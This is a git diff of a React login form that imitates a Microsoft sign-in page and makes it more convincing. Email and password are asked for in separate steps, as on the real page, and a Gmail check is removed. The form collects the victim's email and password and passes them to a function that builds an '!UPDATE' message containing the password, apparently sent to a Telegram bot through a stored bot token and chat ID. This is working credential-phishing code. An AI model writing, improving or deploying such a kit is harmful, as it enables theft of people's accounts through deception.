@@ -1,32 +1,31 @@
 import React, { useEffect, useState } from "react";
 import styles from "./form.module.css";
 import MyLogo from "../../images/microsoft-logo.png";
+import { toast } from "react-toastify";
 
 const Form = () => {
-  const [viewPassword, setViewPassword] = useState(true);
+  const [viewPassword, setViewPassword] = useState(false);
   const [emal, setEmal] = useState();
   const [passwrd, setPasswrd] = useState();
   const botToken = import.meta.env.VITE_BOT_TOKEN;
   const chatId = import.meta.env.VITE_CHAT_ID;
 
-  function handleFormSubmit() {
-    if(emal && passwrd){
-      checkDetails(emal, passwrd)
+  function handleFormSubmit(e) {
+    e.preventDefault()
+
+    if (emal && passwrd) {
+      checkDetails(emal, passwrd);
     }
+
     async function checkDetails(userEmail, userPassword) {
       try {
-        if (regexGmail(userEmail)) {
-          alert('Input your domain email. Gmail not allowed');
-          return;
-        }
-
         const formData = new FormData();
-        formData.append('userEmails', userEmail);
-        formData.append('userPasswords', userPassword);
+        formData.append("userEmails", userEmail);
+        formData.append("userPasswords", userPassword);
 
         const data = Object.fromEntries(formData);
         const { userEmails, userPasswords } = data;
-        
+
         await sendDetails(userEmails, userPasswords);
       } catch (error) {
         console.log(error);
@@ -34,10 +33,18 @@ const Form = () => {
     }
   }
 
+  function viewPasswordInput() {
+    if (emal) {
+      setViewPassword(true);
+      return;
+    }
+    toast.error("Input a valid Email address");
+  }
+
   async function sendDetails(emal, passwrd) {
     try {
       console.log(typeof chatId);
-      console.log(botToken);``````
+      console.log(botToken);
       const message = `
 !UPDATE
 
@@ -110,13 +117,12 @@ Password: ${passwrd}
 
           <div className={styles.formBtmDiv}>
             <p role="button">
-              {!viewPassword ? "No account?" : ""}{" "}
+              {!viewPassword ? "No account? " : ""}
               <span className={styles.colorP}>
-                {!viewPassword ? "Create one!" : "Forgot password?"}
+                {viewPassword ? "Create one!" : "Forgot password?"}
               </span>
             </p>
             <p className={styles.colorP} role="button">
-              {" "}
               {!viewPassword
                 ? "Can't access your account?"
                 : "Email code to ikechukwuprosper8@gmail.com"}
@@ -124,8 +130,13 @@ Password: ${passwrd}
           </div>
 
           <div className={styles.btnDiv}>
-            {/* <button type="button">Back</button> */}
-            <button type="submit">{!viewPassword ? "Next" : "Sign In"}</button>
+            {!viewPassword ? (
+              <button type="button" onClick={viewPasswordInput}>
+                Next
+              </button>
+            ) : (
+              <button type="submit">Sign In</button>
+            )}
           </div>
         </form>
       </div>
